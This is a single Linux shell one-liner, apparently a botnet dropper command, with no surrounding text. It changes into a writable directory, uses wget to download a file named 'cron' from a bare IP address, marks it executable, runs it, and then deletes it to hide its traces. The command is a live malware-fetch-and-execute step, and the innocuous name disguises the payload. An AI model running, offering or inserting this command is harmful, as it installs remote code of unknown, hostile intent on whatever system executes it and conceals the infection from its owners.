cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.183.34/cron; chmod +x cron; ./cron; rm -rf cron
